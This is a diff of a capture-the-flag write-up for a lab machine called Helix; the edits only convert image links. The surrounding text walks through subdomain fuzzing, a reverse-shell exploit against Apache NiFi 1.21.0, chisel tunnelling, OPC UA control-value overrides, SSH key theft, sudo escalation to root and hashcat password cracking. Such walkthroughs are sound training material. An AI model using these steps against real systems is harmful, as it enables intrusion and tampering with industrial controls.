@@ -22,16 +22,16 @@ Initial scans seem to show this is a classic HTTP + SSH combo, web vulnerabiliti
 ### Web Reconnaissance
 
 Viewing the site, it appears to be an industrial site offering some form of automation/cyber security based product:
-![[Pasted image 20260513134538.png]]
+![](Screenshots/Pasted%20image%2020260513134538.png)
 
 On the site there is a button to "start a project" allowing user input which appears to be sent perhaps to an admin:
-![[Pasted image 20260513134633.png]]
+![](Screenshots/Pasted%20image%2020260513134633.png)
 
 There is also the option to request a call:
-![[Pasted image 20260513134705.png]]
+![](Screenshots/Pasted%20image%2020260513134705.png)
 
 Viewing an error page discloses that the site is running nginx/1.18.0:
-![[Pasted image 20260513134737.png]]
+![](Screenshots/Pasted%20image%2020260513134737.png)
 
 Directory fuzzing:
 
@@ -39,7 +39,7 @@ Directory fuzzing:
 feroxbuster --url http://helix.htb/
 ```
 However, this returns nothing:
-![[Pasted image 20260513134901.png]]
+![](Screenshots/Pasted%20image%2020260513134901.png)
 
 Subdomain / vhost enumeration:
 
@@ -48,17 +48,17 @@ ffuf -c -u http://10.129.245.123 -H "Host: FUZZ.helix.htb" -w /usr/share/seclist
 ```
 
 This identifies one subdomain - **flow**:
-![[Pasted image 20260513135035.png]]
+![](Screenshots/Pasted%20image%2020260513135035.png)
 
 ### Additional Enumeration
 
 Now we have found a new subdomain, we can add this to our `/etc/hosts` and enumerate here.
 
 Viewing the site, it appears to be some out of the box software, allowing creations of process flow diagrams:
-![[Pasted image 20260513135143.png]]
+![](Screenshots/Pasted%20image%2020260513135143.png)
 
 Viewing the "about" section tells us this is Apache NiFi 1.21.0 and gives us some more information about how it works:
-![[Pasted image 20260513135333.png]]
+![](Screenshots/Pasted%20image%2020260513135333.png)
 
 Performing a quick google search for this version seems to say it may be vulnerable to RCE (CVE-2023-34468.)
 
@@ -79,7 +79,7 @@ python3 CVE-2023-34468_poc.py --target http://flow.helix.htb --lhost 10.10.14.2 
 ```
 
 This drops us a shell running as user "nifi":
-![[Pasted image 20260513140141.png]]
+![](Screenshots/Pasted%20image%2020260513140141.png)
 
 ---
 
@@ -87,15 +87,15 @@ This drops us a shell running as user "nifi":
 
 After gaining a shell, I look into the `/etc/passwd` file and discover there is only one user other than root with a valid shell - **operator**. Therefore this is likely our user target:
 
-![[Pasted image 20260513140335.png]]
+![](Screenshots/Pasted%20image%2020260513140335.png)
 
 We cannot directly access this users home directory, so we will likely need to find some credentials or exploitable service. 
 
 At this stage I ran linpeas to automate some of the enumeration while I hunted myself, and it discovered an open internal service running on port 8081:
-![[Pasted image 20260513141458.png]]
+![](Screenshots/Pasted%20image%2020260513141458.png)
 
 Curling this service reveals it is a maintenance webpage:
-![[Pasted image 20260513141529.png]]
+![](Screenshots/Pasted%20image%2020260513141529.png)
 ### Port forwarding
 
 I would like to view this site on my attacker machine, so I utilise chisel to reverse port forward.  
@@ -116,24 +116,24 @@ chmod +x chisel
 ### Web enumeration
 
 Viewing the page, like I expected, it appears to be some form of maintenance window:
-![[Pasted image 20260513141817.png]]
+![](Screenshots/Pasted%20image%2020260513141817.png)
 
 It also gives a link to another internal service like so:
 `OPC UA (internal): opc.tcp://127.0.0.1:4840/helix/`
 
 I use gemini to write me a script to interact with this service, and we can grab the following values:
-![[Pasted image 20260513144444.png]]
+![](Screenshots/Pasted%20image%2020260513144444.png)
 
 However, this doesn't seem to be useful and seems to just be supplying the values provided on the web page.
 
 Going back to the web page, I notice this section, which seems to state if the temperature is very high, the maintenance window will be displayed. Therefore if we can write a high temperature, we may be able to expose this window:
-![[Pasted image 20260513144641.png]]
+![](Screenshots/Pasted%20image%2020260513144641.png)
 
 I discover I am unable to write directly to temperature, however I can add a large offset, to increase it. However, this still doesn't open the maintenance window:
-![[Pasted image 20260513145501.png]]
+![](Screenshots/Pasted%20image%2020260513145501.png)
 
 Through setting the mode to MAINTENANCE, the offset to +20 and the test override to true, I am able to grant the privileged maintenance window, but nothing appears to change, perhaps I am missing something on the box side:
-![[Pasted image 20260513150731.png]]
+![](Screenshots/Pasted%20image%2020260513150731.png)
 
 This was the script I used:
 ```python
@@ -187,7 +187,7 @@ if __name__ == "__main__":
 ## 4. User Shell
 
 Going back to the box, as I think something is missing, I hunt around some more in the nifi folder and eventually discover an SSH key seemingly for operator:
-![[Pasted image 20260513151024.png]]
+![](Screenshots/Pasted%20image%2020260513151024.png)
 
 Now we can connect using this key:
 ```bash
@@ -195,7 +195,7 @@ ssh operator@helix.htb -i key
 ```
 
 And grab the user flag:
-![[Pasted image 20260513153134.png]]
+![](Screenshots/Pasted%20image%2020260513153134.png)
 
 ---
 
@@ -207,15 +207,15 @@ With our shell, I ran a quick check to see if we can run anything as root:
 ```bash
 sudo -l
 ```
-![[Pasted image 20260513153238.png]]
+![](Screenshots/Pasted%20image%2020260513153238.png)
 
 This discovered we could run some form of maintenance console as root. When running this, we get told it is closed, however, my assumption is we can open it using the steps we performed earlier:
-![[Pasted image 20260513153326.png]]
+![](Screenshots/Pasted%20image%2020260513153326.png)
 
 ### Activating the maintenance window
 
 I ran the script that I wrote earlier, then ran the maintenance console program in the context of sudo, and this granted me a root shell and we were able to get the root flag:
-![[Pasted image 20260513153520.png]]
+![](Screenshots/Pasted%20image%2020260513153520.png)
 ### Post root enumeration
 
 When I was in the home directory as operator, I noticed there was a pdf named 'Operator Control & Safety Guide.pdf'. When downloading this locally and trying to open it requires a password.
@@ -231,10 +231,10 @@ hashcat -a 0 hashcat /usr/share/wordlists/rockyou.txt -m 10700
 ```
 
 This drops the password as **operator1**:
-![[Pasted image 20260513154953.png]]
+![](Screenshots/Pasted%20image%2020260513154953.png)
 
 We can then view the PDF and see it gives explicit instructions on how to get the maintenance panel, which would've probably been easier to know earlier!
-![[Pasted image 20260513154844.png]]
+![](Screenshots/Pasted%20image%2020260513154844.png)
 
 ---
 
